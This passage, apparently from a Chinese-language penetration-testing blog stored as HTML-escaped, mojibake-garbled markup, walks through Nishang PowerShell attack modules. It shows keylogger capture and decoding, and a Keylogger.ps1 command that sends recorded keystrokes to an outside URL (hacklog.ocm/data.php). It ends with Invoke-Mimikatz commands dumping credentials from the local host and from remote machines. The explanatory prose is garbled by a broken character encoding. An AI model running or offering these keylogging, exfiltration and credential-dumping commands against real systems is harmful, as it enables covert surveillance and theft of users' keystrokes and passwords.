&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--     ----            -------------   -----         -----------     --------             -------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1      Job1            BackgroundJob   Running       True            localhost            Keylogger $args[0] $ar...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œå®Œä¼šä¿å­˜åœ¨å½“å‰ç”¨æˆ·çš„Tempç›®å½•ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:\Users\test\AppData\Local\Temp\3\key.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹åˆ°å†…å®¹å¤§æ¦‚æ˜¯ä¸€äº›è¿™ç§å­—ç¬¦ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-83 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-65 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-70 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-71 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-67 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-86 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-67 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-88 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-77 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;S-77 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¿˜éœ€è¦å¯¹è¯¥æ–‡ä»¶è¿›è¡Œè§£ææ‰èƒ½çœ‹åˆ°å®Œæ•´çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Utility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Parse_Keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Parse_Keys&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Temp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;para&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹para.txtæ–‡ä»¶å°±æ˜¯è®°å½•çš„å®é™…å†…å®¹äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;esdsfsdfdsfsafgcvxbcvbcvxbvvbcxmmmmmmmmmmmparaBackspaceBackspaceBackspaceBackspace./gBackspacemuBackspaceippBackspaceaBackspaceBackspacec./upaEnterpaBackspaceBac...ckspaceBackspace...ceBackspaceBackspaceBackspaceBackspaceBacksp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®ƒé‡Œé¢è¿˜æœ‰ä¸€äº›å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-Help&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Keylogger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Keylogger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ‘˜è¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Nishang&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Payload&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;which&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;logs&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;è¯­æ³•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Keylogger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-CheckURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-MagicString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CommonParameters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Keylogger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-persist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-exfil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-CheckURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-MagicString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-ExfilOption&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-dev_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-URL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-DomainName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-AuthNS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CommonParameters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¯”å¦‚ä¸‹é¢çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Keylogger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-CheckURL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hacktest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-MagicString&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exfil&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExfilOption&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WebServer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hacklog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ocm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;php&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨å°±æ˜¯æ£€æŸ¥&lt;code&gt;http://hacktest.com/test.html&lt;/code&gt;æ˜¯å¦å­˜åœ¨å­—ç¬¦ä¸²&lt;code&gt;stop&lt;/code&gt;,å¦‚æœå­˜åœ¨é‚£å°±åœæ­¢è®°å½•ï¼Œè¿˜ä¼šæŠŠè®°å½•çš„å†…å®¹å‘é€åˆ°&lt;code&gt;http://hacklog.ocm/data.php&lt;/code&gt;å½“ä¸­ã€‚&lt;/p&gt;
&lt;h3 id=&#34;invoke-mimikatz-1&#34;&gt;Invoke-Mimikatz&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªè€ç”Ÿå¸¸è°ˆäº†ï¼Œè·å–å‡­è¯çš„åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-Mimikatz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Mimikatz&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DumpCerts&lt;/span&gt;    &lt;span class=&#34;c&#34;&gt;#dumpæœ¬æœºçš„å‡­è¯ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Mimikatz&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DumpCerts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;computer1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;computer2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c&#34;&gt;#dumpå‡ºè¿œç¨‹çš„ä¸¤å°è®¡ç®—æœºçš„å‡­è¯ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
